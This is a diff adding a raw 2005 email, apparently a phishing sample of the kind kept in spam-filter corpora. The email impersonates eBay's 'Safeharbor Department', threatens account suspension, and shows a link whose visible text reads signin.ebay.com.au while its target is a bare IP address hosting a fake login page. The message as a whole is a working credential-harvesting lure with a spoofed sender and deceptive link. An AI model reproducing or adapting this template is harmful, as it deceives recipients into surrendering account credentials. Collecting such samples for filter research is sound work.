@@ -1,0 +1,100 @@
+Return-Path: <root@ns.monami.co.th>
+Delivered-To: em-ca-bruceg@em.ca
+Received: (qmail 23216 invoked by uid 115); 19 Jul 2005 16:24:03 -0000
+Received: from root@ns.monami.co.th by churchill by uid 64011 with qmail-scanner-1.22 
+ ( Clear:RC:0(203.149.3.242):. 
+ Processed in 0.432436 secs); 19 Jul 2005 16:24:03 -0000
+Received: from taurus.datapro.co.th (HELO ns.monami.co.th) (203.149.3.242)
+  by churchill.factcomp.com with SMTP; 19 Jul 2005 16:23:59 -0000
+Received: (from root@localhost)
+	by ns.monami.co.th (8.11.6/linuxconf) id j6JGLGG17202;
+	Tue, 19 Jul 2005 23:21:16 +0700
+Date: Tue, 19 Jul 2005 23:21:16 +0700
+Message-Id: <200507191621.j6JGLGG17202@ns.monami.co.th>
+To: bruceg@em.ca
+Subject: Login And VeriFy Your eBay Acoount 
+From: "support@ebay.com"<support@ebay.com>
+Content-Type: text/html
+Content-Length: 4301
+
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD>
+<META http-equiv=Content-Type content="text/html; charset=iso-8859-1">
+<META content="MSHTML 6.00.2900.2627" name=GENERATOR>
+<STYLE></STYLE>
+</HEAD>
+<BODY bgColor=#ffffff>
+<DIV><FONT face=Arial size=2>
+<DIV>
+<TABLE cellSpacing=0 cellPadding=2 width="100%" bgColor=#eeeef8 border=0>
+  <TBODY>
+  <TR>
+    <TD><STRONG>eBay Notification</STRONG>&nbsp;</TD></TR>
+  <TR bgColor=#d6dcfe height=2>
+    <TD></TD></TR></TBODY></TABLE><BR>
+<DIV>
+<P>Dear customers:</P>
+<P><BR><FONT face=arial>After fraud complaints from the eBay members, the eBay 
+Inc. had developed a security program against the fraudulend attempts of 
+accounts thefts. For that we have to securise all the members informations by 
+updating and checking the registrated informations. Please update&nbsp; your 
+information by completing the form from the forwarded link so we can check your 
+account validity and your identity&nbsp;:</FONT></P>
+<P align=left><A onclick="return ShowLinkWarning()" 
+href="http://210.204.207.123/eBay/index.htm" target=_blank><FONT face=arial 
+color=#0000ff>signin.ebay.com.au/aw-cgi/eBayISAPI.dll?SignIn&amp;ssPageName=h:h:sin:eBayproblems</FONT></A><BR><FONT 
+face=arial></FONT></P>
+<P align=left><FONT face=arial>and login to eBay in order to update your 
+informations. </FONT></P>
+<P align=left>This&nbsp;process will take 5 days, period when you will not 
+be&nbsp;able to&nbsp;acces your eBay account. After this period you will receive 
+instructions to enter and securise your eBay account.&nbsp;</P>
+<P align=left>&nbsp;</P>
+<P align=left>&nbsp; <FONT face=arial>As outlined in our User Agreement, eBay 
+will periodically send you information about site changes and 
+enhancements.<BR>&nbsp;Visit our Privacy Policy and User Agreement if you have 
+any questions.</FONT></P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P><FONT face=arial size=2>Regards,Safeharbor Department</FONT></P>
+<P><FONT face=arial size=2>eBay, Inc.</FONT></P>
+<P>&nbsp;</P>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#cccccc>
+  <TBODY>
+  <TR>
+    <TD height=1></TD></TR></TBODY></TABLE>
+<P align=left><FONT 
+style="FONT-WEIGHT: bold; FONT-SIZE: x-small; FONT-FAMILY: arial, 
+sans-serif">&nbsp;<FONT size=1>Per the User Agreement, Section 9, we may 
+immediately issue a warning, temporarily suspend, indefinitely suspend or 
+terminate your membership and refuse to provide our services to you if we 
+believe that your actions may cause financial loss or legal liability for you, 
+our users or us. We may also take these actions if we are unable to verify or 
+authenticate any information you provide to us.</FONT></FONT></P>
+<P><EM></EM><A href="http://pages.ebay.com.au/help/community/png-priv.html" 
+target=_blank><EM></EM></A>&nbsp;<BR>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#cccccc>
+  <TBODY>
+  <TR>
+    <TD height=1></TD></TR></TBODY></TABLE></P>
+<P class=LargePara></P>
+<P><FONT size=1>As outlined in our User Agreement, eBay will periodically send 
+you information about site changes and enhancements. Visit our </FONT><A 
+href="http://pages.ebay.com.au/help/policies/privacy-policy.html?ssPageName=ADME:X:LC:US:16" 
+target=_blank><FONT color=#000099 size=1>Privacy Policy</FONT></A><FONT size=1> 
+and </FONT><A 
+href="http://pages.ebay.com.au/help/policies/user-agreement.html?ssPageName=ADME:X:LC:US:15" 
+target=_blank><FONT color=#000099 size=1>User Agreement</FONT></A><FONT size=1> 
+if you have any questions.</FONT> 
+<DIV><FONT face="Arial, Verdana" color=#666666 size=1>
+<P align=center>Copyright © 2005 eBay Inc. All Rights Reserved.<BR>Designated 
+trademarks and brands are the property of their respective owners.</P>
+<P align=center>eBay and the eBay logo are trademarks of eBay 
+Inc.</P></FONT></DIV></DIV></DIV></XBODY><!-- toctype = X-unknown --><!-- toctype = text 
+--><!-- text --><!-- END TOC -->
+<P>The HTML graphics in this message have been displayed. [<A 
+href="http://us.f314.mail.yahoo.com/ym/spamoptions?YY=16237&amp;order=down&amp;sort=date&amp;pos=0"><FONT 
+color=#003399>Edit Preferences</FONT></A> - <A 
+href="javascript:Help('http://us.rd.yahoo.com/mail_us/help/?http://help.yahoo.com/help/us/mail/context/context-71.html')"><FONT 
+color=#003399>What's This?</FONT></A>]</P></FONT></DIV></BODY></HTML>
